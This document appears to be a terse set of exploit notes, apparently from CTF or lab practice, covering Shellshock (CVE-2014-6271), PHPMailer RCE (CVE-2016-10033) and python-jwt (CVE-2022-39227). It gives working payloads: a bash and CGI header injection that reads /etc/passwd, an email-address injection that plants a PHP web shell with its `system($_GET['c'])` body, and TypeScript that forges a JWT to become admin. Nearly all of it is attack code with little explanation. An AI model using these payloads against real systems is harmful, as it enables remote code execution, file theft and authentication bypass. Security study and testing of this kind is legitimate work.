## CVE-2014-6271/Shellshock

PoC

```bash
env x='() { :;}; echo vulnerable' bash -c "echo test"
```

cgi-bin

```
GET /cgi-bin/status HTTP/1.1
Host: ptl-38f14b900c61-5be94f304dc9.libcurl.me
User-Agent: () { :;}; echo \$(</etc/passwd)
```

## CVE-2016-10033/PHPMailer RCE

PoC (email address)

```
"attacker@127.0.0.1\" -oQ/tmp/ -X/var/www/shell.php root"@127.0.0.1
```

PoC (email body)

```php
<?php system($_GET['c']); ?>
```

## CVE-2022-39227/python-jwt

PoC

```json
{
  "HEADER.FAKEPAYLOAD.": "",
  "protected": "HEADER",
  "payload": "PAYLOAD",
  "signature": "SIGNATURE"
}
```

expliot

```ts
const [header, payload, signature] =
  "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NjM1MzUzMjgsImlhdCI6MTc2MzQ0ODkyOCwianRpIjoiV0QyejA2cjRCclRFT00tRFZWeG9WZyIsIm5iZiI6MTc2MzQ0ODkyOCwidXNlcm5hbWUiOiIxMjMifQ.aY6knsz4yaxQLrwteFmsY6BD5fTzvFAtlc1t_E5bcjX1bCNs8h43ba8FS1L2r91Q8L5e6NvsOMtU25CGDrepcOLk6raVoQYo_gQAZ5PKNU8yOC940SOiH5KcTfPfgP15ye7h_uLvSm0p4JJrIcmP5ilrF5sdWFw-SSeay3576krLAxmJiqVexmAz0NU6nXJddf9HYbodsI09Zh28hmnAV8pUyVQnleAyQKBXWR6YAlwAtZvJtw2IbGAWINIKMibPU_V35a0Xsj6thY0QfNonLSgXnqZdza0u5kCwNgBQs3xzf2L50mTOQquTPYbBB9BSGhFd8-UrO7NqLZIJBT_p1g".split(
    ".",
  );
// header => { "alg": "RS256", "typ": "JWT" }
// payload => { "exp": 1763535328, "iat": 1763448928, "jti": "WD2z06r4BrTEOM-DVVxoVg", "nbf": 1763448928, "username": "123" }
// signature => 不重要

// 構造 fakePayload
const payloadObj = JSON.parse(atob(payload));
payloadObj.username = "admin";
const fakePayload = btoa(JSON.stringify(payloadObj));

// jws 最後要塞回 cookie
const jws = JSON.stringify({
  [`${header}.${fakePayload}.`]: "",
  protected: header,
  payload: payload,
  signature: signature,
});
```
